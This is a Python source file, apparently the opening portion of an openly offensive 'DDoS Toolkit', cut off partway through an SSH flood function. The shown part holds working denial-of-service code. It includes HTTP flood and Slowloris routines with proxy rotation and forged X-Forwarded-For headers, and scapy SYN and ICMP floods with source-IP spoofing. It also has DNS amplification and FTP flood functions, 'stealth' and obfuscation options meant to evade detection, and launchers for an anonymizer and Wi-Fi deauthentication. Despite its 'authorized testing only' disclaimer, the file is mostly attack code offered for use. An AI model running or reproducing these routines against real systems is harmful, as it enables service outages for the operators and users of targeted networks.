#!/usr/bin/env python3
# -*- coding: utf-8 -*-
### BEGIN INIT INFO
# Provides:          ddos_toolkit
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: DDoS Toolkit
# Description:       Comprehensive toolkit for simulating various DDoS attacks for ethical cybersecurity testing, penetration testing
# and network resilience evaluation. Includes 20+ attack vectors, proxy support, performance monitoring, and detailed reporting.
# Author:            
# + LIONMAD <https://github.com/Midohajhouj>
# Version:           v.1.0
# License:           MIT License - https://opensource.org/licenses/MIT
# Dependencies:      python3 (>=3.7), aiohttp, scapy, dnspython, colorama, tqdm, psutil.
# Support:           https://github.com/Midohajhouj/DDoS-Toolkit/issues
# Security:          Requires root privileges for attacks
# Disclaimer:        For authorized testing only. Use responsibly.
### END INIT INFO ###

import sys
import importlib
import gzip
from typing import Optional, List, Dict, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum, auto
import re
import ipaddress
import ssl
from urllib.parse import urlparse
import requests
from tabulate import tabulate

class AttackType(Enum):
    HTTP_FLOOD = auto()
    SLOWLORIS = auto()
    UDP_FLOOD = auto()
    SYN_FLOOD = auto()
    ICMP_FLOOD = auto()
    DNS_AMPLIFICATION = auto()
    FTP_FLOOD = auto()
    SSH_FLOOD = auto()
    NTP_AMPLIFICATION = auto()
    MEMCACHED_AMPLIFICATION = auto()
    SMURF = auto()
    TEARDROP = auto()
    HTTP2_FLOOD = auto()
    SLOW_POST = auto()
    XML_BOMB = auto()
    NTLM_AUTH_FLOOD = auto()
    CHAR_GEN = auto()
    RST_FLOOD = auto()
    ACK_FLOOD = auto()
    HTTP_FRAGMENTATION = auto()
    WS_DOS = auto()
    QUIC_FLOOD = auto()
    LAND_ATTACK = auto()
    PING_OF_DEATH = auto()

def check_library(lib_name: str) -> None:
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name.split(".")[0])
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name.split('.')[0]} --break-system-packages")
        sys.exit(1)

# ================== Third-Party Libraries ==================
required_libraries = [
    "aiohttp", "asyncio", "argparse", "scapy.all", "dns.resolver",
    "colorama", "tqdm", "requests", "tabulate", "time", "threading",
    "concurrent.futures", "random", "json", "itertools", "collections",
    "uuid", "base64", "hashlib", "zlib", "hmac", "signal", "os",
    "subprocess", "socket", "struct", "logging", "psutil", "shutil",
    "dataclasses", "re", "ipaddress", "ssl", "urllib.parse"
]

for lib in required_libraries:
    check_library(lib.split(".")[0])
    
import aiohttp
import asyncio
import time
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import json
from itertools import cycle
from collections import deque
from uuid import uuid4
from base64 import b64encode
import hashlib
import zlib
import hmac
import signal
import sys
import os
import subprocess
import socket
import struct
import logging
import psutil
import shutil
import scapy.all as scapy
import dns.resolver
from colorama import init, Fore, Style
from tqdm import tqdm
from typing import Optional
from dataclasses import dataclass
import re
import ipaddress
import ssl
from urllib.parse import urlparse
import requests
from tabulate import tabulate

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)
stop_event = threading.Event()
attack_start_time = 0

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

@dataclass
class AttackStats:
    start_time: float
    end_time: float
    requests_sent: int
    successful_requests: int
    failed_requests: int
    min_rps: float
    max_rps: float
    avg_rps: float
    cpu_usage: List[float] = field(default_factory=list)
    mem_usage: List[float] = field(default_factory=list)
    network_usage: List[int] = field(default_factory=list)

# Extended User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.0 Chrome/120.0.0.0 TV Safari/537.36",
    "Mozilla/5.0 (PlayStation 5 8.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

SERVICE_PORTS = {
    "http": 80,
    "https": 443,
    "ftp": 21,
    "ssh": 22,
    "dns": 53,
    "ntp": 123,
    "memcached": 11211,
    "char-gen": 19,
    "quic": 443,
    "ws": 80,
    "wss": 443
}

def display_banner() -> None:
    """Display the tool banner."""
    print(f"""
{BLUE}
███████████████████████████████████████████████████████████████████████████████████████████████████                                     
 ▄▄▄▄▄    ▄▄▄▄▄      ▄▄▄▄     ▄▄▄▄     ▄▄▄▄▄▄▄▄   ▄▄▄▄     ▄▄▄▄   ▄▄      ▄▄   ▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄         
 ██▀▀▀██  ██▀▀▀██   ██▀▀██  ▄█▀▀▀▀█    ▀▀▀██▀▀▀  ██▀▀██   ██▀▀██  ██      ██  ██▀  ▀▀██▀▀ ▀▀▀██▀▀▀ 
 ██    ██ ██    ██ ██    ██ ██▄           ██    ██    ██ ██    ██ ██      ██▄██      ██      ██    
 ██    ██ ██    ██ ██    ██  ▀████▄       ██    ██    ██ ██    ██ ██      █████      ██      ██    
 ██    ██ ██    ██ ██    ██      ▀██      ██    ██    ██ ██    ██ ██      ██  ██▄    ██      ██    
 ██▄▄▄██  ██▄▄▄██   ██▄▄██  █▄▄▄▄▄█▀      ██     ██▄▄██   ██▄▄██  ██▄▄▄▄▄ ██   ██▄ ▄▄██▄▄    ██         
 ▀▀▀▀▀    ▀▀▀▀▀      ▀▀▀▀    ▀▀▀▀▀        ▀▀      ▀▀▀▀     ▀▀▀▀   ▀▀▀▀▀▀▀ ▀▀    ▀▀ ▀▀▀▀▀▀    ▀▀    
|U|S|E| |T|H|E| |T|O|O|L|  |A|T| |Y|O|U|R| |O|W|N| |R|I|S|K|  |L|I|O|N|M|A|D|  |S|A|L|U|T|  |Y|O|U|                                                                                        
███████████████████████████████████████████████████████████████████████████████████████████████████
{RESET}
""")

def display_help() -> None:
    """Display comprehensive help information."""
    print(f"""
{YELLOW}╔══════════════════════════════════════════════════════╗
{YELLOW}║ {BLUE}DDoS Toolkit v.1.0 - Help Information{YELLOW}                ║
{YELLOW}╚══════════════════════════════════════════════════════╝
{RESET}
{CYAN}For more info, visit our website: https://ddostoolkit.vercel.app/{RESET}
{BLUE}Usage: ddos [OPTIONS]{RESET}
  {GREEN}-u, --url URL{RESET}              Target URL or IP address (required for most attacks)
  {GREEN}-a, --attack-mode MODE{RESET}     Type of attack to perform (see below)
  {GREEN}-t, --threads NUM{RESET}          Number of threads/workers (default: 10)
  {GREEN}-d, --duration SEC{RESET}         Attack duration in seconds (default: 60)
  {GREEN}-r, --rate-limit RPS{RESET}       Rate limit per thread (default: 100)
  {GREEN}-p, --pause SEC{RESET}            Delay between requests (default: 0.1)
  {GREEN}--proxies FILE{RESET}             File containing proxy list (one per line)
  {GREEN}--results FILE{RESET}             Save attack results to JSON file
  {GREEN}-v, --version{RESET}              Show version information and exit
  {GREEN}-s, --scan{RESET}                 Perform network scan before attack
  {GREEN}--anonymizer [start|stop]{RESET}  Enable/disable anonymizer for attack
  {GREEN}--wifi-deauth{RESET}              Perform Wi-Fi deauthentication attack
  {GREEN}-i, --interactive{RESET}          Start interactive command-line interface
  {GREEN}--port PORT{RESET}                Specify target port (default based on attack)
  {GREEN}--payload-size BYTES{RESET}       Custom payload size (default: 1024)
  {GREEN}--random-ports{RESET}             Use random ports for flood attacks
  {GREEN}--tls{RESET}                      Use TLS/SSL for applicable attacks
  {GREEN}--stealth{RESET}                  Enable stealth mode (slower but less detectable)
  {GREEN}--jitter MS{RESET}                Add random delay jitter (milliseconds)
  {GREEN}--obfuscate{RESET}                Obfuscate attack traffic
  {GREEN}--spoof-ips FILE{RESET}           File containing IPs to spoof (one per line)

{YELLOW}Attack Modes:{RESET}
  {CYAN}http-flood{RESET}               {CYAN}slowloris{RESET}               {CYAN}http2-flood{RESET}
  {CYAN}udp-flood{RESET}                {CYAN}syn-flood{RESET}               {CYAN}goldeneye{RESET}
  {CYAN}icmp-flood{RESET}               {CYAN}dns-amplification{RESET}       {CYAN}slow-read{RESET}
  {CYAN}ntp-amplification{RESET}        {CYAN}memcached-amplification{RESET} {CYAN}zero-byte{RESET}
  {CYAN}smurf{RESET}                    {CYAN}teardrop{RESET}                {CYAN}random-packets{RESET}
  {CYAN}ssl-flood{RESET}                {CYAN}land-attack{RESET}             {CYAN}ping-of-death{RESET}
  {CYAN}slow-post{RESET}                {CYAN}xml-bomb{RESET}                {CYAN}ntlm-auth-flood{RESET}
  {CYAN}char-gen{RESET}                 {CYAN}rst-flood{RESET}               {CYAN}ack-flood{RESET}
  {CYAN}http-fragmentation{RESET}       {CYAN}ws-dos{RESET}                  {CYAN}quic-flood{RESET}
  {CYAN}ftp-flood{RESET}                {CYAN}ssh-flood{RESET}               {CYAN}slow-flood{RESET}
  {CYAN}arp-spoofing{RESET}             {CYAN}dhcp-starvation{RESET}         {CYAN}ntp-monlist{RESET}
  {CYAN}ssdp-amplification{RESET}       {CYAN}snmp-amplification{RESET}      {CYAN}ldap-amplification{RESET}

{YELLOW}Warning:{RESET} {RED}This tool should only be used for authorized security testing.{RESET}
""")

def parse_args():
    parser = argparse.ArgumentParser(
        description=f"{YELLOW}DDoS Toolkit v.1.0{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # Core attack options
    core_group = parser.add_argument_group(f"{CYAN}Core Options{RESET}")
    core_group.add_argument("-u", "--url", help="Target URL or IP address")
    core_group.add_argument("-a", "--attack-mode", 
                          choices=["http-flood", "slowloris", "udp-flood", "syn-flood", 
                                  "icmp-flood", "dns-amplification", "ftp-flood", 
                                  "ssh-flood", "ntp-amplification", "memcached-amplification", 
                                  "smurf", "teardrop", "http2-flood", "goldeneye", 
                                  "slow-read", "zero-byte", "random-packets", "ssl-flood",
                                  "land-attack", "ping-of-death", "slow-post", "xml-bomb",
                                  "ntlm-auth-flood", "char-gen", "rst-flood", "ack-flood",
                                  "http-fragmentation", "ws-dos", "quic-flood"],
                          default="http-flood",
                          help="Type of attack to perform")
    core_group.add_argument("-t", "--threads", type=int, default=10,
                          help="Number of threads/workers")
    core_group.add_argument("-r", "--rate-limit", type=int, default=100,
                          help="Rate limit per thread (requests per second)")
    core_group.add_argument("-p", "--pause", type=float, default=0.1,
                          help="Pause time between requests")
    core_group.add_argument("-d", "--duration", type=int, default=1500,
                          help="Attack duration in seconds")
    core_group.add_argument("--proxies", help="File containing proxy list")
    core_group.add_argument("--results", help="File to save results (JSON)")
    core_group.add_argument("--port", type=int, help="Specify target port")
    core_group.add_argument("--payload-size", type=int, default=1024,
                          help="Custom payload size in bytes")
    core_group.add_argument("--random-ports", action="store_true",
                          help="Use random ports for flood attacks")
    core_group.add_argument("--tls", action="store_true",
                          help="Use TLS/SSL for applicable attacks")
    core_group.add_argument("--stealth", action="store_true",
                          help="Enable stealth mode (slower but less detectable)")
    core_group.add_argument("--jitter", type=int, default=0,
                          help="Add random delay jitter (milliseconds)")
    core_group.add_argument("--obfuscate", action="store_true",
                          help="Obfuscate attack traffic")
    core_group.add_argument("--spoof-ips", help="File containing IPs to spoof")

    # Additional features
    feature_group = parser.add_argument_group(f"{MAGENTA}Additional Features{RESET}")
    feature_group.add_argument("-s", "--scan", action="store_true",
                             help="Perform network scan before attack")
    feature_group.add_argument("--wifi-deauth", action="store_true",
                             help="Perform Wi-Fi deauthentication attack")
    feature_group.add_argument("--anonymizer", choices=["start", "stop"],
                             help="Enable/disable anonymizer")
    feature_group.add_argument("-i", "--interactive", action="store_true",
                             help="Start interactive CLI")

    # Information options
    info_group = parser.add_argument_group(f"{GREEN}Information{RESET}")
    info_group.add_argument("-h", "--help", action="store_true",
                          help="Show this help message and exit")
    info_group.add_argument("-v", "--version", action="store_true",
                          help="Show version information and exit")

    return parser.parse_args()

def load_proxies(proxy_file: str) -> List[str]:
    """Load proxies from a text file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def load_spoof_ips(spoof_file: str) -> List[str]:
    """Load IP addresses for spoofing from a text file."""
    try:
        with open(spoof_file, "r") as f:
            ip_list = f.read().splitlines()
        valid_ips = [ip.strip() for ip in ip_list if ip.strip() and is_valid_ip(ip.strip())]
        print(f"Loaded {len(valid_ips)} spoof IPs.")
        return valid_ips
    except FileNotFoundError:
        print(f"Spoof IP file '{spoof_file}' not found.")
        return []

def validate_proxies(proxies: List[str]) -> List[str]:
    """Validate proxy servers using multithreading."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str) -> bool:
    """Check if a proxy server is working."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def check_proxy_health(proxy: str) -> bool:
    """Check the health of a proxy server."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

async def monitor_proxy_health(proxies: List[str]) -> None:
    """Continuously monitor proxy health and remove dead proxies."""
    while not stop_event.is_set():
        for proxy in proxies[:]:  # Create a copy for iteration
            if not await check_proxy_health(proxy):
                proxies.remove(proxy)
                print(f"Removed unhealthy proxy: {proxy}")
        await asyncio.sleep(60)

def generate_payload(payload_type: str, secret_key: Optional[bytes] = None, size: int = 1024) -> Optional[bytes]:
    """Generate various types of attack payloads."""
    if secret_key is None:
        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")
    
    try:
        payload_id = str(uuid4())
        data = b64encode(os.urandom(size)).decode()
        
        payload = {"id": payload_id, "data": data}
        
        payload_str = json.dumps(payload, separators=(',', ':'))
        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
        payload["signature"] = signature
        
        logger.debug(f"Generated signature: {signature}")

        if payload_type == "json":
            compressed_payload = compress_payload(json.dumps(payload).encode())
        elif payload_type == "xml":
            xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")
        elif payload_type == "form":
            return json.dumps(payload).encode()
        else:
            logger.error(f"Invalid payload type: {payload_type}")
            return None
        
        return compressed_payload
    except Exception as e:
        logger.error(f"Error generating payload: {e}")
        return None

def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
    """Compress payload data using specified algorithm."""
    try:
        if compression_type == "gzip":
            compressed_data = gzip.compress(data)
            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
        else:
            compressed_data = zlib.compress(data)
            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
        
        return compressed_data
    except Exception as e:
        logger.error(f"Error compressing data: {e}")
        return data

def wifi_deauth(mode: str) -> None:
    """Perform Wi-Fi deauthentication attack."""
    try:
        wifideauth_path = "/opt/DDoS-Toolkit/assets/wifideauth"
        
        if not os.path.isfile(wifideauth_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", wifideauth_path, "wlan0", "-i"]
        
        print(f"{BLUE}[*] Starting network scan on wlan0..{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on wlan0 completed successfully.{RESET}")
    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
        
def run_network_scanner(target_ip: str) -> None:
    """Run network scanning tool against target IP."""
    try:
        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
        
        if not os.path.isfile(netscan_path):
            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
            return

        if not shutil.which("python3"):
            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
            return

        command = ["python3", netscan_path, "-t", target_ip]

        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
        subprocess.run(command, check=True)

        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")

    except subprocess.CalledProcessError as cpe:
        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
    except FileNotFoundError as fnf:
        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
    except Exception as e:
        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")

def run_anonymizer(mode: str) -> None:
    """Run anonymizer script to mask network traffic."""
    try:
        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
        
        if not os.path.isfile(anonymizer_path):
            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
            sys.exit(1)
        
        if mode not in ["start", "stop"]:
            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
            sys.exit(1)
        
        command = ["bash", anonymizer_path, mode]
        
        action_message = "Starting" if mode == "start" else "Stopping"
        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
        
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
        else:
            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
            sys.exit(1)
    
    except FileNotFoundError:
        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
        sys.exit(1)
    
    except subprocess.SubprocessError as e:
        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
        sys.exit(1)
    
    except Exception as e:
        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
        sys.exit(1)
    
    finally:
        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
        sys.exit(0)

async def resolve_target(target_url: str) -> Optional[str]:
    """Resolve domain name to IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            print(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str) -> bool:
    """Check if string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def get_random_jitter(jitter_ms: int) -> float:
    """Get random jitter delay in seconds."""
    return random.randint(0, jitter_ms) / 1000.0

def obfuscate_packet(packet: bytes) -> bytes:
    """Obfuscate packet data with random noise."""
    if len(packet) < 10:
        return packet
    # Insert random bytes at random positions
    for _ in range(random.randint(1, 5)):
        pos = random.randint(0, len(packet))
        packet = packet[:pos] + os.urandom(1) + packet[pos:]
    return packet

async def rate_limited_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                             rate_limit: int, proxies: Optional[List[str]] = None, 
                             headers: Optional[Dict[str, str]] = None, 
                             payload_type: str = "json", retry: int = 3,
                             stealth: bool = False, jitter: int = 0, 
                             obfuscate: bool = False, spoof_ips: Optional[List[str]] = None) -> None:
    """Perform rate-limited HTTP flood attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        # Apply obfuscation if enabled
                        if obfuscate and payload:
                            payload = obfuscate_packet(payload)

                        proxy = next(proxy_pool) if proxy_pool else None
                        
                        # Apply stealth options
                        if stealth:
                            headers.update({
                                "X-Forwarded-For": next(spoof_ip_pool) if spoof_ip_pool else ".".join(str(random.randint(1, 254)) for _ in range(4)),
                                "Connection": "keep-alive",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                            })
                            pause_time = max(pause_time, 0.5)  # Slower in stealth mode

                        # Add jitter if specified
                        if jitter > 0:
                            await asyncio.sleep(get_random_jitter(jitter))

                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, 
                            data=payload, timeout=aiohttp.ClientTimeout(total=5)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                        await asyncio.sleep(2 ** attempt)
                await asyncio.sleep(pause_time)

async def slowloris_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                          rate_limit: int, proxies: Optional[List[str]] = None, 
                          headers: Optional[Dict[str, str]] = None, retry: int = 3,
                          stealth: bool = False, jitter: int = 0) -> None:
    """Perform Slowloris attack (partial HTTP requests) with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        
                        # Apply stealth options
                        if stealth:
                            headers.update({
                                "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
                                "Connection": "keep-alive",
                                "Accept-Encoding": "gzip, deflate, br"
                            })
                            pause_time = max(pause_time, 1.0)  # Slower in stealth mode

                        # Add jitter if specified
                        if jitter > 0:
                            await asyncio.sleep(get_random_jitter(jitter))

                        async with session.get(
                            target_url, headers=headers, 
                            proxy=next(proxy_pool) if proxy_pool else None
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        await asyncio.sleep(pause_time)
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def syn_flood(target_ip: str, target_port: int, duration: int, 
             stealth: bool = False, random_ports: bool = False,
             spoof_ips: Optional[List[str]] = None) -> None:
    """Perform SYN flood attack with stealth options."""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_port = random.randint(1024, 65535) if random_ports else target_port
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            
            ip_layer = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            tcp_layer = scapy.TCP(sport=src_port, dport=target_port, flags="S")
            packet = ip_layer / tcp_layer
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during SYN flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("SYN flood attack completed.")

def icmp_flood(target_ip: str, duration: int, stealth: bool = False,
              spoof_ips: Optional[List[str]] = None) -> None:
    """Perform ICMP ping flood attack with stealth options."""
    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip) / scapy.ICMP()
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during ICMP flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("ICMP flood attack completed.")

async def dns_amplification(target_ip: str, duration: int, stealth: bool = False,
                           spoof_ips: Optional[List[str]] = None) -> None:
    """Perform DNS amplification attack with stealth options."""
    print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            packet = packet / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during DNS amplification: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("DNS amplification attack completed.")

def ftp_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
    """Perform FTP flood attack with stealth options."""
    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
        except Exception as e:
            print(f"Error during FTP flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("FTP flood attack completed.")

def ssh_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
    """Perform SSH flood attack with stealth options."""
    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
